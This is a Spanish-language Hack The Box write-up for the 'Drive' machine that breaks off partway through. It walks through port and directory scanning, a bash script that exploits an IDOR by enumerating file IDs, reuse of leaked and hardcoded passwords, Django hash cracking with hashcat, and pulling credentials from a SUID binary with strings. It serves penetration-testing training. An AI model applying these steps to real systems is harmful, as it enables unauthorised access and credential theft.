# Drive

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/a7b35d19-c956-4d63-b967-d0b53487013c)

***
 - Source:https://app.hackthebox.com/machines/Drive
- OS: Linux
- Dificultad: Hard 💀
- IP: 10.10.11.241
- Temas: ``Realistic``, ``IDOR``, `Binary analysis`, `sqlite3 explotation`.
***
***
### Enumeración:

- Realizamos un escaneo de puertos:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV drive.htb 
[sudo] contraseña para kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-23 10:20 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 10:20
Scanning drive.htb (10.10.11.235) [65535 ports]
Discovered open port 80/tcp on 10.10.11.235
Discovered open port 22/tcp on 10.10.11.235
Completed SYN Stealth Scan at 10:20, 16.42s elapsed (65535 total ports)
Initiating Service scan at 10:20
Scanning 2 services on drive.htb (10.10.11.235)
Completed Service scan at 10:20, 7.05s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.235.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:20
Completed NSE at 10:21, 2.75s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:21
Completed NSE at 10:21, 2.44s elapsed
Nmap scan report for drive.htb (10.10.11.235)
Host is up, received user-set (0.23s latency).
Scanned at 2024-02-23 10:20:34 EST for 28s
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.91 seconds
           Raw packets sent: 79956 (3.518MB) | Rcvd: 79596 (3.184MB)
~~~

- Vemos la página web, nada interesante a simple vista:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/60b931e6-6278-425d-acdb-ee32d803caee)

- Más abajo vemos posibles usuarios:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/e16926ad-abc2-4124-9b6d-7a9661d635ae)

- Enumeré directorios, mala idea yo del futuro. Varios nombres me hicieron creer que la máquina iba hacia un file upload attack:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive]
└─$ gobuster dir -u http://drive.htb -w /usr/share/wordlists/dirb/big.txt -t 50 --add-slash --no-error -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://drive.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact/             (Status: 200) [Size: 6923]
/home/                (Status: 200) [Size: 3315]
/login/               (Status: 200) [Size: 1542]
/logout/              (Status: 302) [Size: 0] [--> /]
/register/            (Status: 200) [Size: 2077]
/reports/             (Status: 200) [Size: 2125]
/static/              (Status: 403) [Size: 162]
/subscribe/           (Status: 500) [Size: 145]
/upload/              (Status: 302) [Size: 0] [--> /login/]
/upload-photo/        (Status: 302) [Size: 0] [--> /login/]
/upload-pictures/     (Status: 302) [Size: 0] [--> /login/]
/upload-photos/       (Status: 302) [Size: 0] [--> /login/]
/upload-video/        (Status: 302) [Size: 0] [--> /login/]
/upload-videos/       (Status: 302) [Size: 0] [--> /login/]
/upload1/             (Status: 302) [Size: 0] [--> /login/]
/upload_images/       (Status: 302) [Size: 0] [--> /login/]
/upload_files/        (Status: 302) [Size: 0] [--> /login/]
/upload2/             (Status: 302) [Size: 0] [--> /login/]
/upload_dir/          (Status: 302) [Size: 0] [--> /login/]
/upload_file/         (Status: 302) [Size: 0] [--> /login/]
/upload_img/          (Status: 302) [Size: 0] [--> /login/]
/uploadedfiles/       (Status: 302) [Size: 0] [--> /login/]
/uploaded_files/      (Status: 302) [Size: 0] [--> /login/]
/uploaded_images/     (Status: 302) [Size: 0] [--> /login/]
/upload_pic/          (Status: 302) [Size: 0] [--> /login/]
/uploadcp/            (Status: 302) [Size: 0] [--> /login/]
/uploaded_img_x/      (Status: 302) [Size: 0] [--> /login/]
/uploaded_temp/       (Status: 302) [Size: 0] [--> /login/]
/uploaded/            (Status: 302) [Size: 0] [--> /login/]
/uploaded_logos/      (Status: 302) [Size: 0] [--> /login/]
/uploadedimages/      (Status: 302) [Size: 0] [--> /login/]
/uploader/            (Status: 302) [Size: 0] [--> /login/]
/uploadfiles/         (Status: 302) [Size: 0] [--> /login/]
/uploadfile/          (Status: 302) [Size: 0] [--> /login/]
/uploadify/           (Status: 302) [Size: 0] [--> /login/]
/uploades/            (Status: 302) [Size: 0] [--> /login/]
/uploadimages/        (Status: 302) [Size: 0] [--> /login/]
/uploadimg/           (Status: 302) [Size: 0] [--> /login/]
/uploadphoto/         (Status: 302) [Size: 0] [--> /login/]
/uploadimage/         (Status: 302) [Size: 0] [--> /login/]
/uploads/             (Status: 302) [Size: 0] [--> /login/]
/uploads2/            (Status: 302) [Size: 0] [--> /login/]
/uploadpic/           (Status: 302) [Size: 0] [--> /login/]
/uploads_user/        (Status: 302) [Size: 0] [--> /login/]
/uploads_forum/       (Status: 302) [Size: 0] [--> /login/]
/uploads_group/       (Status: 302) [Size: 0] [--> /login/]
/uploads_admin/       (Status: 302) [Size: 0] [--> /login/]
/uploads_event/       (Status: 302) [Size: 0] [--> /login/]
/uploads_video/       (Status: 302) [Size: 0] [--> /login/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
~~~

- Después del altercado, creamos una cuenta y en seguida nos logueamos:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/4ccdd075-abdf-44cd-afbc-d1f6b8504393)

- Podemos subir archivos:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/282d8e21-b56e-4853-b15f-e28905fa1ed4)

- Revisando un poco más la página, veo que existe una especie de carpeta compartida donde vemos un archivo del administrador, y ese número 100 en la URL me quiere decir algo:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/196b8031-7d78-4c9d-b89d-f37b3c0dc4ef)

- Hice un script para enumerar los archivos exixtentes:

~~~bash
#!/bin/bash

check_file() {
  x=$1
  rsp=$(curl -s -o /dev/null -w "%{http_code}" -X GET "http://drive.htb/${x}/getFileDetail/" -H "Cookie: sessionid=ra10h8mnoi6ihox4fuowap771wmejd34")
  if [ "$rsp" -ne 500 ]; then
    echo -ne "\n[+] El archivo ${x} existe ---> Status code = ${rsp}\n"
  else
    echo -ne "."
  fi
}

export -f check_file

seq 0 300 | xargs -P 15 -I {} bash -c 'check_file "$@"' _ {}
~~~

- Y me mostró lo siguiente:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive]
└─$ ./recon.sh
..........................................................................
[+] El archivo 79 existe ---> Status code = 401
......................
[+] El archivo 98 existe ---> Status code = 401
[+] El archivo 100 existe ---> Status code = 200
[+] El archivo 101 existe ---> Status code = 401
[+] El archivo 99 existe ---> Status code = 401
.......................................................................................................................................................................................................  
~~~

- Al parecer solo tenemos autorización para ver el archivo 100.
- Vamos a subir un archivo de prueba, a ver si se le asigna algún atributo especial para controlar la visibilidad de otros usuarios:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive]
└─$ echo '[+] Archivo de prueba - Formato ASCII' > test.txt && cat test.txt
[+] Archivo de prueba - Formato ASCII
~~~

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/02e72ecb-4611-4c0e-acdc-075447984cde)

- Una vez subido, podemos sacar la conclusión de que el id es secuencial y no aleatorio:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/57cfbf38-3a4b-4cfe-b010-07c97edc1200)

- Tenemos otro apartado que se encuentra en `http://drive.htb/{id}/block`, donde podemos encontrar otro IDOR. 
- Intentaré cambiar el `getFileDetail` en el script por `block`.
- Me mostraba demasiados códigos de estado `404`, así que los bloqueé:

~~~bash
#!/bin/bash

check_file() {
  x=$1
  rsp=$(curl -s -o /dev/null -w "%{http_code}" -X GET "http://drive.htb/${x}/block/" -H "Cookie: sessionid=ra10h8mnoi6ihox4fuowap771wmejd34")
  if [ "$rsp" -ne 500 ] && [ "$rsp" -ne 404 ]; then
    echo -ne "\n[+] El archivo ${x} existe ---> Status code = ${rsp}\n"
  else
    echo -ne "."
  fi
}

export -f check_file

seq 0 300 | xargs -P 15 -I {} bash -c 'check_file "$@"' _ {}
~~~

- Y ahora tenemos acceso a todos los archivos existentes:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive]
└─$ ./recon_block.sh
..............................................................................
[+] El archivo 79 existe ---> Status code = 200
...................
[+] El archivo 98 existe ---> Status code = 200

[+] El archivo 99 existe ---> Status code = 200
.
[+] El archivo 100 existe ---> Status code = 200
...
[+] El archivo 101 existe ---> Status code = 200
......
[+] El archivo 112 existe ---> Status code = 200
............................................................................................................................................................................................ 
~~~

- Podemos revisar los archivos, en resumen, las notas decían lo siguiente:

##### File 79:

- Filename: ``announce_to_the_software_Engineering_team`` 
- Owner: `admin`
- Group: `doodleGrive-development-team `

~~~
hey team after the great success of the platform we need now to continue the work.
on the new features for ours platform.
I have created a user for martin on the server to make the workflow easier for you please use the password "Xk4@KjyrYv8t194L!".
please make the necessary changes to the code before the end of the month
I will reach you soon with the token to apply your changes on the repo
thanks! 
~~~

##### File 98:

- Filename: ``Hi!`` 
- Owner: `crisDisel `
- Group: `doodleGrive-development-team`

~~~
hi team
have a great day.
we are testing the new edit functionality!
it seems to work great! 
~~~

##### File 99:

- Filename: ``security_announce`` 
- Owner: `jamesMason`
- Group: `security-team`

~~~
hi team
please we have to stop using the document platform for the chat
+I have fixed the security issues in the middleware
thanks! :) 
~~~

##### File 101:

- Filename: ``database_backup_plan!`` 
- Owner: `jamesMason`
- Group: `doodleGrive-development-team`, ``security-team`

~~~
hi team!
me and my friend(Cris) created a new scheduled backup plan for the database
the database will be automatically highly compressed and copied to /var/www/backups/ by a small bash script every day at 12:00 AM
*Note: the backup directory may change in the future!
*Note2: the backup would be protected with strong password! don't even think to crack it guys! :) 
~~~

- Sabemos la ruta en la que existe una base de datos, por lo que a estas alturas podríamos intentar buscar una `LFI`, pero no será necesario.
- También tenemos usuarios enumerados, incluido uno con contraseña:
	- `jamesMason` : ----
	- `crisDisel` : ----
	- `admin` : ----
	- `martin` : `Xk4@KjyrYv8t194L!`

- La contraseña es de ssh, podemos acceder como `martin`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive]
└─$ ssh martin@drive.htb                                              
martin@drive.htb password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-164-generic x86_64)

<------- TRASH ------>

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

martin@drive:~$ 
~~~

***
***
### PrivEsc:

- Una vez dentro, lo primero que hice fue enumerar usuarios:

~~~bash
martin@drive:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
git:x:115:119:Git Version Control,,,:/home/git:/bin/bash
martin:x:1001:1001:martin cruz,,,:/home/martin:/bin/bash
cris:x:1002:1002:Cris Disel,,,:/home/cris:/bin/bash
tom:x:1003:1003:Tom Hands,,,:/home/tom:/bin/bash
~~~

- Son bastantes, habrá que iniciar por la base de datos.
- Montaremos un servidor de Python en el directorio:

~~~bash
martin@drive:/var/www/backups$ ls
1_Dec_db_backup.sqlite3.7z  1_Oct_db_backup.sqlite3.7z  db.sqlite3
1_Nov_db_backup.sqlite3.7z  1_Sep_db_backup.sqlite3.7z
martin@drive:/var/www/backups$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
~~~

- Haremos una descarga recursiva:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive]
└─$ wget http://drive.htb:1234/ -r
--2024-02-23 11:38:28--  http://drive.htb:1234/
Resolviendo drive.htb (drive.htb)... 10.10.11.235
Conectando con drive.htb (drive.htb)[10.10.11.235]:1234... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 650 [text/html]
Grabando a: «drive.htb:1234/index.html»

<------ TRASH ------>

ACABADO --2024-02-23 11:38:45--
Tiempo total de reloj: 17s
Descargados: 6 ficheros, 3.6M en 11s (351 KB/s)
~~~

- Intenté descomprimir los archivos, pero nos solicita una contraseña, ya que al parecer están encriptados:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive/drive.htb:1234]
└─$ 7z x 1_Sep_db_backup.sqlite3.7z

<------ TRASH ------>
    
Enter password (will not be echoed):
ERROR: Data Error in encrypted file. Wrong password? : db.sqlite3
                 
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
~~~

- Decidí echar un vistazo a la base de datos en texto plano:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive/drive.htb:1234]
└─$ sqlite3 db.sqlite3 
SQLite version 3.43.1 2023-09-11 12:01:27
Enter ".help" for usage hints.
sqlite> show databases;
Parse error: near "show": syntax error
  show databases;
  ^--- error here
sqlite> .tables
accounts_customuser                   auth_permission                     
accounts_customuser_groups            django_admin_log                    
accounts_customuser_user_permissions  django_content_type                 
accounts_g                            django_migrations                   
accounts_g_users                      django_session                      
auth_group                            myApp_file                          
auth_group_permissions                myApp_file_groups
~~~

- Encontré hashes:

~~~bash
sqlite> select * from accounts_customuser;
21|sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a|2022-12-26 05:48:27.497873|0|jamesMason|||jamesMason@drive.htb|0|1|2022-12-23 12:33:04
22|sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f|2022-12-24 12:55:10|0|martinCruz|||martin@drive.htb|0|1|2022-12-23 12:35:02
23|sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004|2022-12-24 13:17:45|0|tomHands|||tom@drive.htb|0|1|2022-12-23 12:37:45
24|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f|2022-12-24 16:51:53|0|crisDisel|||cris@drive.htb|0|1|2022-12-23 12:39:15
30|sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3|2022-12-26 05:43:40.388717|1|admin|||admin@drive.htb|1|1|2022-12-26 05:30:58.003372
sqlite> 
~~~

- No les presté mucha atención porque rompí uno de los hashes y la contraseña era incorrecta, así que supongo que la verdadera estará en alguna otra de las bases de datos.
- Por último, decidí ver si existía algún proceso fuera de lo normal ejecutado por alguno de los usuarios existentes:

~~~bash
martin@drive:~$ ps -faux | grep -E "git|cris|tom"
git          971  0.0  4.4 1519504 176928 ?      Ssl  05:02   0:53 /usr/local/bin/gitea web --config /etc/gitea/app.ini
martin      2827  0.0  0.0   6300   656 pts/0    S+   21:42   0:00              \_ grep --color=auto -E git|cris|tom
~~~

- Y en efecto, el usuario `git` está ejecutando el servicio de `gitea`, que normalmente corre en el puerto 3000.
- Si revisamos dentro de la máquina, el puerto 3000 está activo por tcp:

~~~bash
martin@drive:~$ ss -tulp
Netid       State        Recv-Q        Send-Q               Local Address:Port                 Peer Address:Port       Process       
udp         UNCONN       0             0                    127.0.0.53%lo:domain                    0.0.0.0:*                        
udp         UNCONN       0             0                          0.0.0.0:bootpc                    0.0.0.0:*                        
tcp         LISTEN       0             70                       127.0.0.1:33060                     0.0.0.0:*                        
tcp         LISTEN       0             151                      127.0.0.1:mysql                     0.0.0.0:*                        
tcp         LISTEN       0             511                        0.0.0.0:http                      0.0.0.0:*                        
tcp         LISTEN       0             4096                 127.0.0.53%lo:domain                    0.0.0.0:*                        
tcp         LISTEN       0             128                        0.0.0.0:ssh                       0.0.0.0:*                        
tcp         LISTEN       0             511                           [::]:http                         [::]:*                        
tcp         LISTEN       0             128                           [::]:ssh                          [::]:*                        
tcp         LISTEN       0             4096                             *:3000                            *:* 
~~~

- Tendremos que realizar un port-forwarding para que nuestro puerto 3000 sea el 3000 de a máquina, esto lo podemos hacer con ssh, siguiendo la sintaxis ``remotePort``:``localhost``:``localPort``:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive]
└─$ ssh -L 3000:127.0.0.1:3000 martin@drive.htb
~~~

- Y si visitamos nuestro puerto 3000, deberíamos ver una GUI de Gitea:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/e8656dbf-e96e-4581-8dc9-6b4b55458093)

- Aquí encontramos a dos usuarios dentro del panel:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/4e3bda29-5eef-4df1-9a6c-e40275dee67e)
	- `crisDisel`
	- ``martinCruz``

- Podemos probar si de casualidad se han rehutilizado contraseñas:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/68d2d09b-acce-4c6e-b830-473cfece89d7)

- Y nos hemos logueado con éxito.
- Si nos metemos al repositorio existente, podremos ver un archivo bash de backups, en el cual la contraseña está hardcodeada:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/7ed6dd92-5bfa-4689-bef0-759130306ac0)
    - Passwd: `H@ckThisP@ssW0rDIfY0uC@n:)`

- Ahora podemos desencriptar los backups.
- Los mandaré todos a una carpeta que crearé llamada backups:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive/databases]
└─$ ls
 1_db.sqlite3   D_db.sqlite3   N_db.sqlite3   O_db.sqlite3            S_db.sqlite3
~~~

- Ahora bien, sabemos por la estructura que la tabla que nos importa es la de `accounts_customuser`, así que automatizaremos la extracción de los hashes, y filtraré en el output para guardar solo las contraseñas:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive/databases]
└─$ find \ -name *.sqlite3 2>/dev/null | while read db; do sqlite3 $db --line 'select * from accounts_customuser'; done | grep password | awk '{print $3}'
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
pbkdf2_sha256$390000$ZjZj164ssfwWg7UcR8q4kZ$KKbWkEQCpLzYd82QUBq65aA9j3+IkHI6KK9Ue8nZeFU=
pbkdf2_sha256$390000$npEvp7CFtZzEEVp9lqDJOO$So15//tmwvM9lEtQshaDv+mFMESNQKIKJ8vj/dP4WIo=
pbkdf2_sha256$390000$GRpDkOskh4irD53lwQmfAY$klDWUZ9G6k4KK4VJUdXqlHrSaWlRLOqxEvipIpI5NDM=
pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro=
pbkdf2_sha256$390000$TBrOKpDIumk7FP0m0FosWa$t2wHR09YbXbB0pKzIVIn9Y3jlI3pzH0/jjXK0RDcP6U=
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
~~~

- Guardé este output en un archivo `out.txt`, y en seguida filtré para descartar los hashes de ``pbkdf2_sha256``, pues si no lo hago `john` no sabrá que formato utilizar.
- Además, eliminé los hashes repetidos con `sort`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive/databases]
└─$ cat out.txt | grep -v "pbkdf2_sha256" | sort -u
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004
sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a
sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a 
~~~

- Moví esto a un archivo `hashes.txt`.
- Con john no logré sacar nada, así que usé hashcat.
- Nos dice que es un hash `django`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive/databases]
└─$ hashcat --identify hashes.txt 
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    124 | Django (SHA-1)                                             | Framework
~~~

- Y con esto en mente, le indicamos el valor del código del hash:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive/databases]
└─$ hashcat -m 124 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt   

hashcat (v6.2.6) starting

<------ TRASH ------>

sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john316
sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:johniscool
sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93:john boy
sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
~~~

- Y bien, tenemos algunas contraseñas.
- Ahora intentaremos loguearnos con cada una entre los usuarios que conocemos.
- Si filtramos en la base de datos, las contraseñas serían todas de `tomhands`:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive/databases]
└─$ find \ -name *.sqlite3 2>/dev/null | while read db; do sqlite3 $db --line 'select * from accounts_customuser'; done | grep 'sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004' -A 3
    password = sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004
  last_login = 2022-12-24 13:17:45
is_superuser = 0
    username = tomHands
                                                                                                                    
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive/databases]
└─$ find \ -name *.sqlite3 2>/dev/null | while read db; do sqlite3 $db --line 'select * from accounts_customuser'; done | grep 'sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141' -A 3
    password = sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141
  last_login = 2022-12-26 06:02:42.401095
is_superuser = 0
    username = tomHands
                                                                                                                    
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive/databases]
└─$ find \ -name *.sqlite3 2>/dev/null | while read db; do sqlite3 $db --line 'select * from accounts_customuser'; done | grep 'sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93' -A 3
    password = sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93
  last_login = 2022-12-26 06:03:57.371771
is_superuser = 0
    username = tomHands
                                                                                                                    
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Drive/databases]
└─$ find \ -name *.sqlite3 2>/dev/null | while read db; do sqlite3 $db --line 'select * from accounts_customuser'; done | grep 'sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a' -A 3
    password = sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a
  last_login = 2022-12-24 13:17:45
is_superuser = 0
    username = tomHands
~~~

- Entonces, probaremos las 4:

~~~bash
martin@drive:~$ su tom
Password: 
su: Authentication failure
martin@drive:~$ su tom
Password: 
su: Authentication failure
martin@drive:~$ su tom
Password: 
su: Authentication failure
martin@drive:~$ su tom
Password: 
tom@drive:/home/martin$ 
~~~

- Al final, la combinación correcta fue `tom:johnmayer7`.

`[+] User flag: 87ce2b6dcbaa1a3f1c55c1e6dfc39e07`

***
***
### Root:

- Permisos de SUID:

~~~bash
tom@drive:~$ find / -perm -4000 2>/dev/null
/home/tom/doodleGrive-cli
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
<------ TRASH ------>

tom@drive:~$ ls -la /home/tom/doodleGrive-cli
-rwSr-x--- 1 root tom 887240 Sep 13 13:36 /home/tom/doodleGrive-cli
~~~

- Es un binario ejecutable `ELF`:

~~~bash
tom@drive:~$ file /home/tom/doodleGrive-cli
/home/tom/doodleGrive-cli: setuid ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=8c72c265a73f390aa00e69fc06d96f5576d29284, for GNU/Linux 3.2.0, not stripped
~~~

- Intenté realizar fuzzing para desencadenar un buffer overflow, pero tenía el método de seguridad`cannary` activado, así que no podemos sobreescribir el EIP, y lo descaté.
- Probé con nuestro usuario `tom` para iniciar sesión en el binario, pero no hay nada que revisar.
- Al parecer solo hay un usuario que puede loguearse aquí.
- Revisé el binario con `strings` y filtré por contraseñas, a ver si alguna estaba hardcodeada:

~~~bash
tom@drive:~$ strings doodleGrive-cli | grep password -A 10
Enter password for 
moriarty
findMeIfY0uC@nMr.Holmz!
Welcome...!
Invalid username or password.
xeon_phi
haswell
../csu/libc-start.c
FATAL: kernel too old
__ehdr_start.e_phentsize == sizeof *GL(dl_phdr)
Unexpected reloc type in static binary.
FATAL: cannot determine kernel version
__libc_start_main
/dev/full
/dev/null
~~~

- Y tenemos unas credenciales `moriarty:findMeIfY0uC@nMr.Holmz!`

~~~bash
tom@drive:~$ ./doodleGrive-cli 
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
moriarty
Enter password for moriarty:
findMeIfY0uC@nMr.Holmz!
Welcome...!

doodleGrive cli beta-2.2: 
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
~~~

- Si seleccionamos la opción 1, que lista usuarios, se nos muestra algo interesante:

~~~bash
Select option: 1
          id = 16
  last_login = 2023-02-11 07:46:11.212535
is_superuser = 1
    username = admin
       email = admin@drive.htb
    is_staff = 1
   is_active = 1
 date_joined = 2022-12-08 14:59:02.802351

          id = 21
  last_login = 2022-12-24 22:39:42.847497
is_superuser = 0
    username = jamesMason
       email = jamesMason@drive.htb
    is_staff = 0
   is_active = 1
 date_joined = 2022-12-23 12:33:04.637591

          id = 22
  last_login = 2022-12-24 12:55:10.152415
is_superuser = 0
    username = martinCruz
       email = martin@drive.htb
    is_staff = 0
   is_active = 1
 date_joined = 2022-12-23 12:35:02.230289

          id = 23
  last_login = 2022-12-26 06:20:23.299662
is_superuser = 0
    username = tomHands
       email = tom@drive.htb
    is_staff = 0
   is_active = 1
 date_joined = 2022-12-23 12:37:45

          id = 24
  last_login = 2022-12-24 16:51:53.717055
is_superuser = 0
    username = crisDisel
       email = cris@drive.htb
    is_staff = 0
   is_active = 1
 date_joined = 2022-12-23 12:39:15.072407

          id = 29
  last_login = 2024-02-23 16:32:57.644998
is_superuser = 0
    username = retr0
       email = retr0@dedsec.com
    is_staff = 0
   is_active = 1
 date_joined = 2024-02-23 15:25:28.548208
~~~

- Esto se ve interesante, ya que obviamente extrae la información de alguna base de datos.
- Revisamos con `ghidra`, nos pasamos el binario montando un server de Python.
- Podemos ver, si inspeccionamos las funciones, que la que nos lista los usuarios maneja:

